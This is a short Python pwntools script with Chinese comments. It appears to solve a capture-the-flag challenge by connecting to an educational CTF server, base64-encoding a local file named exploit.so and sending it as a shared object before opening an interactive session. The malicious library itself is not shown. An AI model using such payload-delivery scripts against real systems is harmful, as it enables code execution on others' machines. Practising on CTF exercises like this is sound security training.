from pwn import *

# 連接到指定的遠程地址
p = remote('edu-ctf.zoolab.org', 10002)

# 如果該服務有任何初始消息，例如歡迎消息，可以使用以下命令接收它
initial_message = p.recvuntil(b'Give me your share object:').decode()
print(initial_message)

# 讀取exploit.so的內容並編碼為Base64
with open('./exploit.so', 'rb') as f:
    content = f.read()
b64_content = base64.b64encode(content)

# 透過pwntools發送Base64編碼的exploit.so
p.sendline(b64_content)

# 等待回應或繼續互動
p.interactive()
